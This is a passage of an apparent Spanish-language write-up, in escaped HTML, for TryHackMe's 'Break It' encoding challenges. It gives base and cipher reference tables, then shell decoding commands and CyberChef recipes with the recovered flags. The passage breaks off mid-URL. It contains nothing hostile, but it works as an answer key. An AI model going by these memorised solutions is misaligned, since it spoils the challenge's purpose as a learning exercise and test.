&lt;/table&gt;
&lt;br&gt;
&lt;hr /&gt;
&lt;p&gt;Break It nos trae una serie de retos que vienen en tres fases, la primera codificacion en las distintas bases existentes, la segunda fase una serie de retos relacionado a codificacion y encriptacion en cipher, la tercera face pero no la mas facil una serie de retos de codificacion, encriptacion en cipher y bit shift.&lt;/p&gt;
&lt;h4 id=&#34;codificacion-en-base&#34;&gt;Codificacion en Base&lt;/h4&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Base&lt;/th&gt;
&lt;th&gt;Ejemplo: &amp;ldquo;breakit&amp;rdquo;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Base2&lt;/td&gt;
&lt;td&gt;01100010 01110010 01100101 01100001 01101011 01101001 01110100&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Base8&lt;/td&gt;
&lt;td&gt;142 162 145 141 153 151 164&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Base16&lt;/td&gt;
&lt;td&gt;62 72 65 61 6b 69 74&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Base32&lt;/td&gt;
&lt;td&gt;MJZGKYLLNF2A====&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Base58&lt;/td&gt;
&lt;td&gt;4jP4KDubX1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Base62&lt;/td&gt;
&lt;td&gt;22udqyscMu&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Base64&lt;/td&gt;
&lt;td&gt;YnJlYWtpdA==&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Base85&lt;/td&gt;
&lt;td&gt;@WH$gCM@k&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Base91&lt;/td&gt;
&lt;td&gt;%zmfv;:YH&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;encriptacion-cipher&#34;&gt;Encriptacion Cipher&lt;/h4&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Cipher&lt;/th&gt;
&lt;th&gt;Ejemplo: &amp;ldquo;breakit&amp;rdquo;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Caesar Cipher&lt;/td&gt;
&lt;td&gt;iylhrpa (shift 7)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Vigenere Cipher&lt;/td&gt;
&lt;td&gt;uyqtrum (key: thm)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;decodificadores&#34;&gt;Decodificadores&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;http://www.hexworkshop.com/&#34;&gt;&lt;strong&gt;Hex Workshop&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;&lt;strong&gt;CyberChef&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://www.dcode.fr/&#34;&gt;&lt;strong&gt;dcode&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://cryptii.com/pipes/caesar-cipher&#34;&gt;&lt;strong&gt;cryptii&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;base85.io/&#34;&gt;&lt;strong&gt;Base85.io&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;-fase-01---base-&#34;&gt;{ Fase 01 - Base }&lt;/h2&gt;
&lt;h4 id=&#34;1-super-easy&#34;&gt;#1 [Super easy]&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;Reto&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;MVQXG6K7MJQXGZJTGI======
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Solucion&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@uplifted:/media/sckull/Files/tryhackme/BREAKIT$ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;MVQXG6K7MJQXGZJTGI&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;======&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base32 -d
easy_base32
sckull@uplifted:/media/sckull/Files/tryhackme/BREAKIT$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;2easy&#34;&gt;#2[Easy]&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;Reto&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;TVJYWEtZVE1NVlBXRVlMVE1WWlE9PT09
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Solucion&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@uplifted:/media/sckull/Files/tryhackme/BREAKIT$ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; TVJYWEtZVE1NVlBXRVlMVE1WWlE9PT09 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 -d&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base32 -d
double_bases
sckull@uplifted:/media/sckull/Files/tryhackme/BREAKIT$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;3moderate&#34;&gt;#3[Moderate]&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;Reto&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GM4HOU3VHBAW6OKNJJFW6SS2IZ3VAMTYORFDMUC2G44EQULIJI3WIVRUMNCWI6KGK5XEKZDTN5YU2RT2MR3E45KKI5TXSOJTKZJTC4KRKFDWKZTZOF3TORJTGZTXGNKCOE======
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Solucion&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Base32 &amp;gt; Base58 &amp;gt; Base16 &amp;gt; Base64&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;[&lt;strong&gt;Solucion - CyberChef&lt;/strong&gt;]&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://gchq.github.io/CyberChef/#recipe=From_Base32(&#39;A-Z2-7%3D&#39;,true)From_Base58(&#39;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&#39;,true)From_Hex(&#39;Space&#39;)From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,true)&amp;amp;input=R000SE9VM1ZIQkFXNk9LTkpKRlc2U1MySVozVkFNVFlPUkZETVVDMkc0NEVRVUxJSkkzV0lWUlVNTkNXSTZLR0s1WEVLWkRUTjVZVTJSVDJNUjNFNDVLS0k1VFhTT0pUS1pKVEM0S1JLRkRXS1pUWk9GM1RPUkpUR1pUWEdOS0NPRT09PT09PQ
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;4hard&#34;&gt;#4[Hard]&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;Reto&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HRBUGQDUHFWDIXKUIBWXIJTHIE3DCY3BIE2FKQSZHNDE6MRUIA2TWWDMHRBV2ZKCHQWFCTLPIE2EEJDBIBZCEW3OHUSTOLRCHNFGMVC6IFJXIQ2AHVMVONSBHVOVIM2MHVPV42J4HQVCQ4REIFHVIJ2WHFWDYQSUHROGILJCIFIU23CXHNCEIXK2HRDVSXKOHV2SQJLC
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Solucion&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Base85 &amp;gt; Base85 &amp;gt; base32 &amp;gt; base85 &amp;gt; base64 &amp;gt; base58 &amp;gt; base85 &amp;gt; base64 &amp;gt; base64&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;[&lt;strong&gt;Solucion - CyberChef&lt;/strong&gt;]&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://gchq.github.io/CyberChef/#recipe=From_Base85(&#39;!-u&#39;)From_Base32(&#39;A-Z2-7%3D&#39;,false)From_Base85(&#39;!-u&#39;)From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,true)From_Base58(&#39;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&#39;,false)From_Base85(&#39;!-u&#39;)From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,true)From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,true)&amp;amp;input=ODVfY1M3bztaUzg0SFpLOFFcVmM4Tz9LXDhQMnJROE9ZRic2V2wzMzhPWUMoOTJTVms4NTtRQTJHSShMOE81KzI9JyVkYTg1X2NUMTBSPTw4NVdHWDZXP2BVOE9ZQyc3N29zNzhPP1RKNzk7OUA4NiZTZjpKPVlSODU7V0U5aWFWPjhPYzxTOFBxNi84Ni9HYzpKT2hUODYvTWU4UExzNzg2L1BmMWJxWls4NVdEVDspRDA%2BOE9jNk84UDFhPjg0SFpLPV0mKnQ4NWA1UjhQRGBEOE9jOU8xLEQ6Ijg1O05AOFFcVkA4NV9pVjtjbFtnODYuS0U7K2FNTA
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;5insane&#34;&gt;#5[Insane]&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;Reto - Pastebin&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://pastebin.com/kKkr9SJL&#34;&gt;&lt;strong&gt;Pastebin&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Solucion&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Base32 &amp;gt; Base85 &amp;gt; Base10 &amp;gt; Base16 &amp;gt; Base91 &amp;gt; Base58 &amp;gt; Base16 &amp;gt; Base64 &amp;gt; Base10 &amp;gt; Base16&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;[&lt;strong&gt;Solucion - CyberChef, dcode.fr&lt;/strong&gt;]&lt;/p&gt;
&lt;p&gt;1- Base32 &amp;gt; Base85 &amp;gt; Base10 &amp;gt; Base16&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://gchq.github.io/CyberChef/#recipe=From_Base32(&#39;A-Z2-7%3D&#39;,false)From_Base85(&#39;!-u&#39;)From_Decimal(&#39;Space&#39;,false)From_Hex(&#39;Auto&#39;)&amp;amp;input=R0lVVE1PUlBHQkZFTVZSS0dFVkVDUlpSRk03R0dKUkRHRkRWS0tCUkdJVFQyWFpZRk03RlNZVFJHSVVVUVJSVkdCRUdBTFpNRk03R1lJWkJHTkJDTUpaMkdFVkVDUlpPRk03R1cyM1NHRkRWS0tCUkdGUVNFV0pSRk03RlNZVFJHSVVTMk5CUkdNU0RVSVJVRk03R1cyRFJHSVVTMk5CUUdFVkVDUlpQRk03R1lKUkNHRkRWS0tCUkdJVFQyVlJOR0JFR0FMWk1GTTdHVzIzU0dJVVZVVVJWR0VWRUNSWlBGTTdUV1FKSEdGRFZLS0JSR0JFR0FRSlhGTTdGU1lUUkdJVVMyTkJTR0ZRU0VVWlFGTTdHVzVEVkdJVVMyTkJRR0VWRUNSWlFGTTdUV1FKSEdGRFZLS0JSR0lUVDJZUlhGTTdGU1lUUkdJVVQ2UUJRR0JGRlFZUk1HRVZFQ1JaUUZNN0dZSlJDR0ZEVktLQlJHSVRUMjNSNkZNN0ZTWVRSR0lVVVFSUlJHQkZFTVZSS0dFVkVDUlpTRk03R0dLSkVHRkRWS0tCUkdFVkVDUlpWRk03RlNZVFJHSVVUNlFCVEdNU0RVSVJVRk03R1c0TFVHSVVVUVJSVEdFVkVDUlpQRk03VFdSWkpHRkRWS0tCUkdCU0NNTVJKR0JFR0FMWk1GTTdHVzRMVUdJVVNJTFJQR0VWRUNSWlJGTTdUV1JCSUdGRFZLS0JSR0JFR0FOSlBGTTdGU1lUUkdJVVQ2UUJVR0pCRlFaSlNGTTdHVzVEVkdJVVdHV0JXR0VWRUNSWlNGTTdFT1VKS0ZNN0ZTWVRSR0lVVkNUQjJHTVNEVUlSVUZNN0dXMjNTR05CRFFNWjRHRVZFQ1JaUUZNN1RXUkJJR0ZEVktLQlJHSVRUMllSV0ZNN0ZTWVRSR0lVU0lMUlZHSk9YRzNSVEZNN0dXNExVR0lVVlVVUlZHRVZFQ1JaU0ZNN0dXNURWR0ZEVktLQlJHQkVHQU5KTkZNN0ZTWVRSR0lVVE1PUlRHRkNWWVNSUEZNN0dXMjNTR0lVVVFSUlRHRVZFQ1JaU0ZNN1RXUUpIR0ZEVktLQlJHQkVHQVFKWUZNN0ZTWVRSR0lVVVFSUlVHTTdWS0taVkZNN0dZSVpCR0ZSVkNWSldHRVZFQ1JaT0ZNN0dXMkRSR0ZEVktLQlJHSVRUMllSV0ZNN0ZTWVRSR0lVVVFSUlZHSVRUMlhCUkZNN0dXMkRSR0JTV0VRQktHRkRWS0tCUkdGQ1ZZUkJMR0JFR0FMWk1GTTdHVzIzU0dJVVQ2UUJTR0VWRUNSWlNGTTdHVzNUVEdGRFZLS0JSR0JTQ01PWlZGTTdGU1lUUkdJVVNJTFJSR0ZRU0VVWlFGTTdHVzRMVUdGUlZDVkpXR0VWRUNSWlFGTTdHR0pSREdGRFZLS0JSR0JTQ01QUlBGTTdGU1lUUkdJVVRNT1JQR0JGRU1WUktHRVZFQ1JaU0ZNN0VPVUpKRk03RlNZVFJHSVVTMk5CU0dFVkVDUUpPRk03R1c1RFZHSVVXR1dCV0dFVkVDUlpQRk03R1cyM1NHRkRWS0tCUkdJVFQyWVJURk03RlNZVFJHSVVTMk5CU0dCRUdBTFpNRk03R1cyM1NHRlJWQ1ZKV0dFVkVDUlpURk03R1cyRFJHRkRWS0tCUkdCRUdBTkpORk03RlNZVFJHSVVVUVJSUkdCRkU2WEJMR0VWRUNSWlJGTTdHVzNUVEdGRFZLS0JSR0JFR0FRSlhGTTdGU1lUUkdJVVRNT1JQR0JGRTZYQkxHRVZFQ1JaU0ZNN0dXMkRSR0ZEVktLQlJHQlNDTVBST0ZNN0ZTWVRSR0lVVDZRQllHSk9YRzNSVEZNN0dXNURWR05CQzZMSjNHRVZFQ1JaU0ZNN1RXUUpIR0ZEVktLQlJHRkNWWVVCUUZNN0ZTWVRSR0lVVVFSUlJHQkZFNlhCTEdFVkVDUlpPRk03R1lLSkRHRkRWS0tCUkdCRUdBTkpTRk03RlNZVFJHSVVUTU9SVEdKT1hHM1JURk03R1czVFRHSVVXR1dCV0dFVkVDUlpQRk03RU9VSktGTTdGU1lUUkdJVVMyTkJTR0JTQ01PQk5GTTdHVzRMVUdJVVZVVVJWR0VWRUNSWlBGTTdUV1FKSEdGRFZLS0JSR0ZDVllVQlNGTTdGU1lUUkdJVVMyTkJXR003VktLWlZGTTdHVzIzU0dCU1dFT1JJR0ZEVktLQlJHRlFTRVdKWEZNN0ZTWVRSR0lVVE1PUlRHQlNDTU9CTkZNN0dXNURWR05CQ01KWjJHRVZFQ1JaUkZNN0dXMkRSR0ZEVktLQlJHRlFTRVpKNEZNN0ZTWVRSR0lVVDZRQlVHSkJGUVpKU0ZNN0dXNURWR0lVUzJOQlFHRVZFQ1JaUEZNN0VPVUpJRk03RlNZVFJHSVVUTU9SVEdCRUdBTFpNRk03R1c1RFZHTkJDNkxKM0dFVkVDUlpRRk03R1c0TFVHRkRWS0tCUkdCRUdBUUpZRk03RlNZVFJHSVVUTU9SVEdCRUdBTFpNRk03R1cyM1NHSVVUNlFCU0dFVkVDUlpTRk03R1lLSkRHRkRWS0tCUkdGUVNFV0pYRk03RlNZVFJHSVVUNlFCVUdCU0NNT0JORk03R1czVFRHSVVVUVJSVEdFVkVDUlpPRk03VFdRSkhHRkRWS0tCUkdGQ1ZZVUJXRk03RlNZVFJHSVVWQ1RCMkdKT1hHM1JURk03R1c1RFZHQlNXRVFCS0dGRFZLS0JSR0ZRU0VXSlZGTTdGU1lUUkdJVVVRUlJWR0ZDVllTUlBGTTdHVzJEUkdCU1dFUEpKR0ZEVktLQlJHRlFTRVpKNEZNN0ZTWVRSR0lVVDZRQlVHQlNDTU9CTkZNN0dXNURWR05CQzZMSjNHRVZFQ1JaUEZNN0dHSlJER0ZEVktLQlJHQlNDTVBSUUZNN0ZTWVRSR0lVVE1PUlBHQkZFTVZSS0dFVkVDUlpRRk03VFdSQklHRkRWS0tCUkdGQ1ZZVEpXRk03RlNZVFJHSVVVUVJSUkdCRkVNVlJLR0VWRUNSWk9GTTdHVzVEVkdGRFZLS0JSR0ZRU0VXSlRGTTdGU1lUUkdJVVQ2UUJZR01TRFVJUlVGTTdHWUlaQkdOQkNNSloyR0VWRUNSWlBGTTdFT1VKSUZNN0ZTWVRSR0lVU0lMUlZHTTdWS0taVkZNN0dXMkRSR0JTV0VQSkpHRkRWS0tCUkdCU0NNTVJKR0VWRUNRSk9GTTdHWUlaQkdCU1dFUEpKR0ZEVktLQlJHRlFTRVdKU0ZNN0ZTWVRSR0lVUzJOQk9HQkZFTVZSS0dFVkVDUlpQRk03R1czVFRHRkRWS0tCUkdGUVNFV0pTRk03RlNZVFJHSVVUNlFCVUdGQ1ZZU1JQRk03R1c1RFZHTkJDTUpaMkdFVkVDUlpTRk03R0dLSkVHRkRWS0tCUkdCU0NNT1pVRk03RlNZVFJHSVVVUVJSVkdCU0NNT0JORk03R1cyM1NHQlNXRVFCS0dGRFZLS0JSR0ZRU0VXSlVGTTdGU1lUUkdJVVRNT1JTR01TRFVJUlVGTTdHVzNUVEdOQkNNSloyR0VWRUNSWlBGTTdFT1VKSkZNN0ZTWVRSR0lVVkNUQldHSVRUMlhCUkZNN0dXMjNTR05CRFFNWjRHRVZFQ1JaU0ZNN0dZS0pER0ZEVktLQlJHQkVHQU1SVUZNN0ZTWVRSR0lVU0lMUlJHQlNDTU9CTkZNN0dXMkRSR05CRFFNWjRHRVZFQ1JaUkZNN0dHSlJER0ZEVktLQlJHSVRUMjNSNEZNN0ZTWVRSR0lVVE1PUlBHQkZGUVlSTUdFVkVDUlpQRk03R1czVFRHRkRWS0tCUkdGUVNFV0pYRk03RlNZVFJHSVVWQ1RCU0dCRkU2WEJMR0VWRUNSWlRGTTdHR0tKRUdGRFZLS0JSR0ZRU0VXSlVGTTdGU1lUUkdJVVMyTkJSR01TRFVJUlVGTTdHWUlaQkdJVVZVVVJWR0VWRUNSWk9GTTdHWUtKREdGRFZLS0JSR0JFR0FOSlBGTTdGU1lUUkdJVVZDVEJWR01TRFVJUlVGTTdHVzRMVUdJVVMyTkJRR0VWRUNSWlFGTTdUV1FKSEdGRFZLS0JSR0ZDVllVQlBGTTdGU1lUUkdJVVVRUlJaR003VktLWlZGTTdHVzRMVUdGUlZDVkpXR0VWRUNSWlNGTTdFT1VKSUZNN0ZTWVRSR0lVUzJOQk9HQkZFTVZSS0dFVkVDUlpSRk03R1czVFRHRkRWS0tCUkdJVFQyWVJSRk03RlNZVFJHSVVVUVJSWkdNN1ZLS1pWRk03R1lJWkJHTkJDNkxKM0dFVkVDUlpPRk03VFdSWkpHRkRWS0tCUkdCRUdBTkpQRk03RlNZVFJHSVVTMk5CUkdNN1ZLS1pWRk03R1cyRFJHSVVVUVJSVEdFVkVDUlpTRk03R1c0TFVHRkRWS0tCUkdJVFQyWVJWRk03RlNZVFJHSVVTMk5CU0dFVkVDUUpPRk03R1c0TFVHQlNXRU9SSUdGRFZLS0JSR0VWRUNVWjNGTTdGU1lUUkdJVVNJTFJOR0JGRTZYQkxHRVZFQ1JaU0ZNN0dXMkRSR0ZEVktLQlJHRlFTRVZSWEZNN0ZTWVRSR0lVVkNUQlZHTVNEVUlSVUZNN0dXNExVR0lVVlVVUlZHRVZFQ1JaUUZNN0dZSVpCR0ZEVktLQlJHRkNWWVVCUkZNN0ZTWVRSR0lVVVFSUlZHRVZFQ1FKT0ZNN0dXM1RUR0ZSVlVXWlhHRVZFQ1JaT0ZNN0VPVUpKRk03RlNZVFJHSVVTSUxSTkdCRkU2WEJMR0VWRUNSWlNGTTdHVzRMVUdGRFZLS0JSR0JFR0FOSk9GTTdGU1lUUkdJVVQ2UUJUR01TRFVJUlVGTTdHVzVEVkdOQkM2TEozR0VWRUNSWlBGTTdUV1JaSkdGRFZLS0JSR0ZDVllVQlBGTTdGU1lUUkdJVVVRUlJaR003VktLWlZGTTdHVzJEUkdJVVdHV0JXR0VWRUNSWlNGTTdHVzVEVkdGRFZLS0JSR0lUVDJZUlZGTTdGU1lUUkdJVVNJTFJRR003VktLWlZGTTdHWUlaQkdJVVNJTFJQR0VWRUNSWk9GTTdFT1VKSkZNN0ZTWVRSR0lVVVFSUlJHQkZFNlhCTEdFVkVDUlpPRk03RU9VSktGTTdGU1lUUkdJVVQ2UUJVR0ZRU0VVWlFGTTdHVzRMVUdJVVRNT1JSR0VWRUNSWlRGTTdHVzNUVEdGRFZLS0JSR0JFR0FOSlFGTTdGU1lUUkdJVVVRUlJWR0pPWEczUlRGTTdHVzIzU0dOQkRRTVo0R0VWRUNSWlJGTTdHWUpSQ0dGRFZLS0JSR0VWRUNPWktHRVZFQ1FKT0ZNN0dXM1RUR0lVVlVVUlZHRVZFQ1JaUkZNN1RXUUpIR0ZEVktLQlJHQkVHQU5KTkZNN0ZTWVRSR0lVVVFSUlZHRlFTRVVaUUZNN0dXNURWR0lVVDZRQlNHRVZFQ1JaU0ZNN0dXNURWR0ZEVktLQlJHRkNWWVhCM0ZNN0ZTWVRSR0lVU0lMUlZHSk9YRzNSVEZNN0dXNExVR0lVVlVVUlZHRVZFQ1JaU0ZNN0dXM1RUR0ZEVktLQlJHQkVHQU5KUEZNN0ZTWVRSR0lVUzJOQlNHRkNWWVNSUEZNN0dXMjNTR0lVVVFSUlRHRVZFQ1JaUUZNN0dHSlJER0ZEVktLQlJHRlFTRVRKTUdCRUdBTFpNRk03R1czVFRHQlNXRVBKSkdGRFZLS0JSR0ZDVllYQjJGTTdGU1lUUkdJVVQ2UUJVR0pCRlFaSlNGTTdHVzIzU0dOQkNNSloyR0VWRUNSWlFGTTdFT1VKS0ZNN0ZTWVRSR0lVUzJOQldHTVNEVUlSVUZNN0dXM1RUR0lVVVFSUlRHRVZFQ1JaUEZNN0dXNURWR0ZEVktLQlJHQlNDTU9aVkZNN0ZTWVRSR0lVUzJOQlJHTVNEVUlSVUZNN0dXNExVR0lVUzJOQlFHRVZFQ1JaUEZNN0dXM1RUR0ZEVktLQlJHQkVHQU5KUEZNN0ZTWVRSR0lVVE1PUlhHTVNEVUlSVUZNN0dXNExVR0lVVDZRQlNHRVZFQ1JaT0ZNN1RXUkJJR0ZEVktLQlJHRkNWWVhCMkZNN0ZTWVRSR0lVUzJOQlJHTTdWS0taVkZNN0dZSVpCR0ZSVkNWSldHRVZFQ1JaU0ZNN0dXM1RUR0ZEVktLQlJHQlNDTVBSVEZNN0ZTWVRSR0lVVE1PUlBHQkZFTVZSS0dFVkVDUlpQRk03VFdRSkhHRkRWS0tCUkdJVFQyM1I1Rk03RlNZVFJHSVVTMk5CT0dCRkU2WEJMR0VWRUNSWk9GTTdUV1JCSUdGRFZLS0JSR0JTQ01QUlJGTTdGU1lUUkdJVVVRUlJSR0JGRTZYQkxHRVZFQ1JaT0ZNN0dXM1RUR0ZEVktLQlJHQlNDTU9aVUZNN0ZTWVRSR0lVUzJOQldHTTdWS0taVkZNN0dXNURWR0JTV0VPUklHRkRWS0tCUkdGQ1ZZWEIyRk03RlNZVFJHSVVTMk5CT0dCRkU2WEJMR0VWRUNSWlJGTTdHVzNUVEdGRFZLS0JSR0lUVDJYWlpGTTdGU1lUUkdJVVQ2UUJVR0pCRlFaSlNGTTdHVzJEUkdJVVdHV0JXR0VWRUNSWlBGTTdFT1VKSUZNN0ZTWVRSR0lVVDZRQllHTVNEVUlSVUZNN0dXNExVR05CQzZMSjNHRVZFQ1JaUUZNN0VPVUpJRk03RlNZVFJHSVVUTU9SVEdCU0NNT0JORk03R1czVFRHSVVUTU9SUkdFVkVDUlpRRk03RU9VSklGTTdGU1lUUkdJVVZDVEJXR0ZDVllTUlBGTTdHVzNUVEdJVVZVVVJWR0VWRUNSWlFGTTdHVzJEUkdGRFZLS0JSR0ZRU0VaSjRGTTdGU1lUUkdJVVQ2UUJVR0JTQ01PQk5GTTdHVzVEVkdJVVdHV0JXR0VWRUNSWlFGTTdFT1VKSkZNN0ZTWVRSR0lVVVFSUlZHSVRUMlhCUkZNN0dXMkRSR0ZSVlVXWlhHRVZFQ1JaUEZNN0dXMjNTR0ZEVktLQlJHRVZFQ1JaUUZNN0ZTWVRSR0lVUzJOQlNHQlNDTU9CTkZNN0dXNURWR0JTV0VRQktHRkRWS0tCUkdCU0NNT1pVRk03RlNZVFJHSVVUNlFCVUdCU0NNT0JORk03R1czVFRHTkJDTUpaMkdFVkVDUlpSRk03RU9VSkpGTTdGU1lUUkdJVVMyTkJPR0JGRU1WUktHRVZFQ1JaUEZNN0VPVUpLRk03RlNZVFJHSVVUNlFCVEdNU0RVSVJVRk03R1cyM1NHSVVWVVVSVkdFVkVDUlpSRk03R1cyRFJHRkRWS0tCUkdCU0NNTVJKR0JTQ01PQk5GTTdHVzRMVUdJVVQ2UUJTR0VWRUNSWlFGTTdHR0pSREdGRFZLS0JSR0VWRUNVWlpGTTdGU1lUUkdJVVNJTFJOR0JGRlFZUk1HRVZFQ1JaUEZNN1RXUlpKR0ZEVktLQlJHSVRUMlZSTkdCU0NNT0JORk03R1c1RFZHTkJDTUpaMkdFVkVDUlpPRk03R1cyRFJHRkRWS0tCUkdGQ1ZZVUJTRk03RlNZVFJHSVVUTU9SVEdCRUdBTFpNRk03R1cyRFJHSVVUNlFCU0dFVkVDUlpRRk03VFdSQklHRkRWS0tCUkdFVkVDUlpTRk03RlNZVFJHSVVVUVJSVkdKQkZRWkpTRk03R1c0TFVHSVVXR1dCV0dFVkVDUlpTRk03VFdSWkpHRkRWS0tCUkdGUVNFVlJZRk03RlNZVFJHSVVTSUxSUkdFVkVDUUpPRk03R1czVFRHTkJDTUpaMkdFVkVDUlpTRk03VFdSQklHRkRWS0tCUkdCU0NNU1JaRk03RlNZVFJHSVVUTU9SU0dNU0RVSVJVRk03R1lJWkJHSVVUNlFCU0dFVkVDUlpSRk03RU9VSklGTTdGU1lUUkdJVVMyTkJTR0JFR0FMWk1GTTdHVzNUVEdOQkRRTVo0R0VWRUNSWlNGTTdHWUtKREdGRFZLS0JSR0lUVDJZUlJGTTdGU1lUUkdJVVVRUlJVR003VktLWlZGTTdHVzVEVkdCU1dFT1JJR0ZEVktLQlJHRkNWWVhCMkZNN0ZTWVRSR0lVVDZRQlFHQkZFNlhCTEdFVkVDUlpQRk03R1lJWkJHRkRWS0tCUkdJVFQyWFpZRk03RlNZVFJHSVVTMk5CV0dNU0RVSVJVRk03R1c1RFZHRlJWVVdaWEdFVkVDUlpTRk03R0dKUkRHRkRWS0tCUkdGUVNFVEpNR0JTQ01PQk5GTTdHVzRMVUdJVVRNT1JSR0VWRUNSWlNGTTdHVzIzU0dGRFZLS0JSR0JFR0FNUlVGTTdGU1lUUkdJVVQ2UUJZR01TRFVJUlVGTTdHVzRMVUdJVVZDVEJVR0VWRUNSWlNGTTdFT1VKS0ZNN0ZTWVRSR0lVVE1PUlRHRVZFQ1FKT0ZNN0dXNExVR0lVVDZRQlNHRVZFQ1JaU0ZNN0dZS0pER0ZEV